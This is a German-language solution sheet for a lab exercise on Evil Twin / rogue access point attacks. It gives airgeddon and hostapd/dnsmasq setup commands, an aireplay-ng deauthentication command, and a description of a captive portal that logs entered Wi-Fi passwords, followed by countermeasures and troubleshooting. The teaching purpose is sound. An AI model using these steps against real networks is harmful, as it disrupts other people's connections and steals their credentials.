# Lösung – Übung 08: Evil Twin / Rogue AP

## 1. Evil Twin aufsetzen

**Komfortabel (airgeddon):**
```bash
sudo airgeddon
# Menü: Evil Twin attacks -> "Evil Twin AP + captive portal"
# ESSID/Kanal des Ziels übernehmen, Interface wählen
```
**Manuell (hostapd + dnsmasq):** `hostapd.conf`:
```
interface=wlan1
ssid=MeinTestAP
channel=6
hw_mode=g
```
```bash
sudo hostapd hostapd.conf
# dnsmasq: DHCP + DNS auf das Fake-Portal umbiegen
sudo dnsmasq -C dnsmasq.conf -d
```

## 2. Client herübertreiben

```bash
# echten AP stören -> Client sucht den (stärkeren) Twin:
sudo aireplay-ng --deauth 0 -a <ECHTE_BSSID> wlan0mon
```
Bei offenem/gleichnamigem Netz verbindet sich der Test-Client zum Twin.

## 3. Captive-Portal (Lab-Demo)

airgeddon liefert ein Portal, das z. B. nach dem „WLAN-Passwort" fragt; Eingaben landen in einem Log. Manuell: ein kleiner Webserver, auf den dnsmasq alle DNS-Anfragen umleitet, mit einer Eingabeseite. **Nur eigene Test-Eingaben** – zur Demonstration des Prinzips.

## 4. Warum offen/PSK anfälliger

- **Offene Netze:** keine AP-Authentifizierung → Twin ununterscheidbar.
- **WPA2-PSK:** Client prüft den AP nicht kryptografisch gegenüber einem Server → Twin mit gleicher PSK/offen + Deauth funktioniert.
- **802.1X/EAP** mit **Server-Zertifikatsprüfung** und **WPA3** bieten gegenseitige/stärkere Authentifizierung → Twin scheitert (falsches/kein Zertifikat).

## 5. Gegenmaßnahmen

- **802.1X/EAP** mit erzwungener **Server-Zertifikatsvalidierung** (Client akzeptiert nur echten RADIUS), **WPA3**.
- Auf Clients „automatisch verbinden"/alte offene Netze entfernen; keine sensiblen Logins über Captive Portals.
- **WIDS/WIPS** (Rogue-/Evil-Twin-Erkennung), Monitoring doppelter BSSIDs/ESSIDs.

## Häufige Fehler / Troubleshooting

- **Client verbindet nicht:** Twin-Signal zu schwach / Deauth wirkt nicht (PMF) → näher/zweites Interface; bei PMF schwieriger.
- **Nur ein Adapter:** AP + Deauth gleichzeitig schwierig → zweiten Adapter nutzen.
- **dnsmasq/hostapd-Konflikt:** NetworkManager stört → `airmon-ng check kill`.
- **Ethik:** Portale, die reale Marken/Dienste imitieren, nicht gegen Dritte; reine Lab-Demo.
